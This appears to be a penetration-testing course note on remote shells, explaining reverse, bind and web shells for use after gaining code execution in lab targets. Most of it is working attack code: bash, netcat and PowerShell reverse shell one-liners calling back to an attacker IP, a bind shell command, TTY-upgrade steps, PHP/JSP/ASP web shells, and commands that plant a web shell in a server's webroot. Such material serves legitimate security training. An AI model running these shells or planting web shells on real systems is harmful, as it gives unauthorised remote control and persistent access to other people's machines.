# Types of Shells

## Overview

Once a vulnerability gives us remote code execution, we need a reliable way to keep interacting with the system without re-exploiting it for every command — a shell (Bash/PowerShell). SSH/WinRM require working credentials first, which we often don't have yet, so the alternative is one of three shell delivery methods.

## Learning Objectives

- Understand and set up a reverse shell
- Understand and set up a bind shell
- Upgrade a raw netcat shell to a full TTY
- Write, upload, and use a web shell

## Shell Types

| Type | Method of Communication |
|---|---|
| Reverse Shell | Connects back to our system, giving control via a reverse connection |
| Bind Shell | Waits for us to connect, giving control once we do |
| Web Shell | Communicates through a web server, accepting commands via HTTP parameters |

## Reverse Shell

Most common — quickest and easiest to obtain.

```bash
nc -lvnp 1234
```

- `-l` listen mode, `-v` verbose, `-n` no DNS resolution, `-p 1234` port.

Find our connect-back IP (the HTB VPN interface, since lab targets have no internet access and can only reach us via VPN):

```bash
ip a   # look for tun0
```

Reliable reverse shell one-liners (see also PayloadAllTheThings):

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Downside:** fragile — if the connection drops, we must re-exploit to get another shell.

## Bind Shell

We connect to the target instead; the target listens on a port and binds its own shell to it.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
nc 10.10.10.1 1234
```

**Upside:** if the connection drops, reconnect immediately. **Downside:** if the bind process stops or the host reboots, access is lost until re-exploited.

## Upgrading TTY

A raw netcat shell has no cursor movement or history. Upgrade with the python/stty method:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo
fg
# press Enter (or type reset + Enter)
```

Then fix terminal size by checking local values (`echo $TERM`, `stty size`) and exporting them in the remote shell:

```bash
export TERM=xterm-256color
stty rows 67 columns 318
```

## Web Shell

A web script accepting commands via HTTP parameters:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

Default webroots:

| Web Server | Default Webroot |
|---|---|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

**Benefit:** bypasses firewall restrictions (uses the existing web port) and survives a target reboot. **Downside:** not fully interactive — each command is a new HTTP request, though this can be scripted for a semi-interactive feel.

## Skills Practiced

- Reverse and bind shell setup
- TTY upgrading for a usable interactive shell
- Writing and deploying a simple web shell

## Key Takeaways

- Reverse shells are easiest but fragile; bind shells survive a dropped connection but not a reboot; web shells survive reboots but aren't interactive.
- Always upgrade a raw netcat shell to a full TTY before doing serious work in it.
- A web shell written directly to the webroot via RCE is a fast way to get persistent command execution without needing an upload vulnerability.
